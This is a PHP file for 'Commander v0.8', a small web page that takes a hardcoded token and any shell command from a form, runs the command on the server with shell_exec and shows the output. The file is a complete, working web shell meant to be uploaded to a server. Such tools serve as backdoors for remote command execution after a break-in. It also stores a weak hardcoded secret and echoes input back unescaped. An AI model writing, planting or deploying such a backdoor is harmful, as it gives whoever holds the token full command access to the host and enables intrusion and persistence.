<?php
    # change this token before uploading commander.php to the server
    # it helps you on secure and private usage
    $username = "commander";
    $token = "d98234hf9";

    $cmd = "";
    $key = "";
    $ret = "";
    if(isset($_POST['password']) && $_POST['password'] == $token && isset($_POST['cmd'])){
        $key = $_POST['password'];
        $cmd = $_POST['cmd'];
        $ret = shell_exec($cmd);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commander v0.8</title>

    <style>
        body{
            background-color: #151515;
        }
        .result{
            display: block;
            height: 400px;
            background-color: #222;
            color: #00e9ff;
            font-size: 20px;
            padding: 20px;
            margin-bottom: 20px;        
            overflow: auto;
        }
        .prompt .field{
            background-color: transparent;
            border: 1px solid darkslateblue;
            font-size: 20px;
            line-height: 35px;
            padding: 5px 10px;
            letter-spacing: 2px;
            margin-bottom: 10px;
            color: yellow;
        }

        .prompt #key,.prompt #username{
            width: 210px;
        }

        .prompt #command{
            width: 500px;
        }

        .prompt .button{
            background-color: #999;
            border: 1px solid gray;
            line-height: 32px;
            width: 145px;
            font-size: 20px;
            color: #333;
            padding: 7px;
            border-radius: 5px;
            font-weight: 600;
            font-family: Arial;
        }
        #username{
        }
    </style>
</head>
<body>
    <div class="result"><pre><?= $ret ?></pre></div>
    <form class="prompt" method="post">
        <input class="field" type="text" id="username" name="username" value="<?= $username ?>" placeholder="USER"/>
        <input class="field" id="password" name="password" autocomplete="false" type="password" placeholder="KEY" value="<?= $key ?>"/><br>
        <input class="field" id="command" type="text" placeholder="COMMAND" name="cmd" autofocus value="<?= $cmd ?>"/>
        <input class="button" type="submit" value="Execute" />
    </form>
</body>
</html>
